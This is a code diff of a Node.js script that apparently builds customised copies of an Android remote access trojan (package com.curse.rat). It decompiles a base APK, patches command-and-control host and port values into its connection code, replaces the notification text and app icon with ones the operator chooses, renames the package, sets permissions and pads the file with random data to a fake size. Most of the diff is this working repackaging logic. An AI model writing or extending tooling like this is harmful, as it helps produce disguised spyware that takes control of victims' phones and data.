@@ -28,19 +28,25 @@ if (process.argv[2] === '--config') {
 const workDir = 'workdir';
 const outputDir = 'output';
 
+// ============================================
+// ✅ التحقق من وجود base.apk قبل البدء
+// ============================================
+if (!fs.existsSync('base.apk')) {
+    console.error("❌ BUILD FAILED: base.apk not found!");
+    console.error(`   Please place a valid base.apk in ${__dirname}`);
+    process.exit(1);
+}
+console.log("✅ base.apk found.");
+
 try {
     console.log("--- Starting Advanced APK Build ---");
     console.log(`Config: AppName=${config.appName}, Package=${config.packageName}, Hosts=${config.hosts}`);
 
-    if (!fs.existsSync('base.apk')) {
-        throw new Error("base.apk not found!");
-    }
-
     if (!fs.existsSync(outputDir)) fs.mkdirSync(outputDir);
 
-    // 1. Decompile
-    console.log("> Decompiling base.apk...");
-    execSync(`apktool d base.apk -o ${workDir} -f`);
+    // 1. Decompile with -r flag to reduce memory usage (fixes "Killed" issue)
+    console.log("> Decompiling base.apk (using -r flag for low memory)...");
+    execSync(`apktool d -r base.apk -o ${workDir} -f`);
 
     // 2. Patch ConnectionManager.smali (Reverted to single HOST/PORT patching)
     console.log("> Patching ConnectionManager...");
@@ -91,7 +97,6 @@ try {
     if (fs.existsSync(apktoolYamlPath)) {
         let content = fs.readFileSync(apktoolYamlPath, 'utf8');
         content = content.replace(/versionName: .*/, `versionName: ${config.appVersion}`);
-        // Increment versionCode if needed, or just keep it 1
         fs.writeFileSync(apktoolYamlPath, content);
     }
 
@@ -107,12 +112,10 @@ try {
     }
     if (mainServiceSmaliPath) {
         let content = fs.readFileSync(mainServiceSmaliPath, 'utf8');
-        // Patch Title (uses appName)
         const titleRegex = /const-string v1, "Curse Service"[\s\S]*?invoke-virtual \{v0, v1\}, Landroidx\/core\/app\/NotificationCompat\$Builder;->setContentTitle/;
         content = content.replace(titleRegex, (match) => {
             return `const-string v1, "${config.appName}"\n    invoke-virtual {v0, v1}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle`;
         });
-        // Patch Text (uses notifText)
         const textRegex = /const-string v1, "Monitoring system security\.\.\."[\s\S]*?invoke-virtual \{v0, v1\}, Landroidx\/core\/app\/NotificationCompat\$Builder;->setContentText/;
         content = content.replace(textRegex, (match) => {
             return `const-string v1, "${config.notifText}"\n    invoke-virtual {v0, v1}, Landroidx/core/app/NotificationCompat$Builder;->setContentText`;
@@ -131,13 +134,10 @@ try {
         allResDirs.forEach(dir => {
             if (dir.startsWith('mipmap-')) {
                 const dirPath = path.join(resDir, dir);
-                // Replace PNGs
                 const pngFiles = ['ic_launcher.png', 'ic_launcher_round.png'];
                 pngFiles.forEach(f => {
                     fs.writeFileSync(path.join(dirPath, f), iconBuffer);
                 });
-                
-                // Remove XML adaptive icons to force PNG usage
                 const xmlFiles = ['ic_launcher.xml', 'ic_launcher_round.xml'];
                 xmlFiles.forEach(f => {
                     const xmlPath = path.join(dirPath, f);
@@ -158,30 +158,22 @@ try {
         const oldPath = oldPkg.replace(/\./g, '/');
         const newPath = newPkg.replace(/\./g, '/');
 
-        // Update AndroidManifest.xml
         console.log("  - Patching AndroidManifest.xml...");
         let manifestPath = path.join(workDir, 'AndroidManifest.xml');
         let manifest = fs.readFileSync(manifestPath, 'utf8');
-        
-        // Replace package attribute and any occurrences of the old package string
         manifest = manifest.replace(new RegExp(`package="${oldPkg}"`, 'g'), `package="${newPkg}"`);
-        manifest = manifest.replace(new RegExp(`"${oldPkg}`, 'g'), `"${newPkg}`); // For fully qualified names in quotes
-        manifest = manifest.replace(new RegExp(`>${oldPkg}`, 'g'), `>${newPkg}`); // For names between tags
-        
+        manifest = manifest.replace(new RegExp(`"${oldPkg}`, 'g'), `"${newPkg}`);
+        manifest = manifest.replace(new RegExp(`>${oldPkg}`, 'g'), `>${newPkg}`);
         fs.writeFileSync(manifestPath, manifest);
 
-        // Global replace in Smali files
         console.log("  - Replacing strings in Smali...");
         const smaliDirs = fs.readdirSync(workDir).filter(d => d.startsWith('smali'));
         smaliDirs.forEach(sDir => {
             const fullPath = path.join(workDir, sDir);
-            // Replace class descriptors (Lcom/curse/rat/...)
             execSync(`grep -rli "L${oldPath}" ${fullPath} | xargs -r sed -i 's|L${oldPath}|L${newPath}|g'`);
-            // Replace dot notation (com.curse.rat)
             execSync(`grep -rli "${oldPkg}" ${fullPath} | xargs -r sed -i 's|${oldPkg}|${newPkg}|g'`);
         });
 
-        // Global replace in XML files (layout, xml, etc.)
         console.log("  - Replacing strings in XML files...");
         const resSubDirs = ['layout', 'xml', 'values', 'menu'];
         resSubDirs.forEach(sub => {
@@ -191,7 +183,6 @@ try {
             }
         });
 
-        // Relocate smali directories
         console.log("  - Relocating Smali directories...");
         smaliDirs.forEach(sDir => {
             const rootSmali = path.join(workDir, sDir);
@@ -201,8 +192,6 @@ try {
                 fs.mkdirSync(newDirFull, { recursive: true });
                 execSync(`cp -r ${oldDirFull}/* ${newDirFull}/ 2>/dev/null || true`);
                 execSync(`rm -rf ${oldDirFull}`);
-                
-                // Clean up empty parent directories
                 let currentDir = path.dirname(oldDirFull);
                 while (currentDir !== rootSmali && currentDir.length > rootSmali.length) {
                     if (fs.existsSync(currentDir) && fs.readdirSync(currentDir).length === 0) {
@@ -222,7 +211,6 @@ try {
         let manifest = fs.readFileSync(path.join(workDir, 'AndroidManifest.xml'), 'utf8');
         const permRegex = /<uses-permission android:name="android\.permission\.(.*?)" \/>/g;
         const toKeep = Array.isArray(config.permissions) ? config.permissions : [];
-        // Standard essential permissions
         const essentials = [
             "INTERNET", 
             "ACCESS_NETWORK_STATE", 
@@ -233,7 +221,6 @@ try {
             "POST_NOTIFICATIONS"
         ];
         essentials.forEach(e => { if (!toKeep.includes(e)) toKeep.push(e); });
-        
         manifest = manifest.replace(permRegex, (fullMatch, permName) => {
             return toKeep.includes(permName) ? fullMatch : `<!-- Removed: ${permName} -->`;
         });
@@ -247,8 +234,6 @@ try {
         if (!fs.existsSync(paddingDir)) fs.mkdirSync(paddingDir, { recursive: true });
         const paddingFile = path.join(paddingDir, 'data.bin');
         const sizeInBytes = config.fakeSize * 1024 * 1024;
-        
-        // Use random data to ensure it's not compressed away
         const buffer = crypto.randomBytes(sizeInBytes);
         fs.writeFileSync(paddingFile, buffer);
     }
